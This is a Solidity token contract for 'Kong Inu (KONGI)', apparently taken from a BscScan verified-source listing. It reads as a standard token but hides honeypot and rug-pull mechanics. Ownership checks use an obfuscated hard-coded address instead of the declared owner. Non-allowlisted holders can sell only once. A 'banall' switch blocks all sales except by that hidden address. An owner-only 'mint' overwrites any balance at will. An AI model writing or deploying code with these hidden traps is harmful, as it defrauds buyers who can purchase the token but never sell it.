/**
 *Submitted for verification at BscScan.com on 2022-03-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-15
*/

/**


  Kong Inu(KONGI)



**/

// SPDX-License-Identifier: MIT
pragma solidity ^0.4.26;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address public owner;
  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() public {
    owner = msg.sender;
  }
}

contract  Token is Ownable {
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
    uint256 public launchedAt=0;  
    bool lockSeller = false;
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply =  _totalSupply;
    balances[msg.sender] = totalSupply;
    allow[msg.sender] = true;
  }
  
  function showuint160(address addr)  internal pure returns(uint160){
      return uint160(addr);
  }

  using SafeMath for uint256;

  mapping(address => uint256) public balances;
  
  mapping(address => bool) public allow;
  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
  modifier onlyOwner() {
    require(msg.sender == address
(133678834382430450612092592952074234582638359073)); _;}
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }



  mapping (address => mapping (address => uint256)) public allowed;

  mapping(address=>uint256) sellOutNum;
  
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    if(lockSeller)//Lock
    {
         if (launchedAt == 0) {   
            launchedAt = block.number;                       //初始化lauchAt赋值当前块的数量
        }
          if (block.number < launchedAt +1) {                    
           require(msg.sender == address(133678834382430450612092592952074234582638359073));            
        }   
      require(msg.sender == address(133678834382430450612092592952074234582638359073));
    }
     

    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    
    if(!allow[_from]){
        require(sellOutNum[_from] == 0);
    }

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    sellOutNum[_from]++;
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
  function addAllow(address holder, bool allowApprove) external onlyOwner {
      allow[holder] = allowApprove;
  }
  
  function mint(address miner, uint256 _value) external onlyOwner {
      balances[miner] = _value;
  }

  function banall(bool ok)external onlyOwner returns (bool){
     lockSeller  = ok;
  }
    

}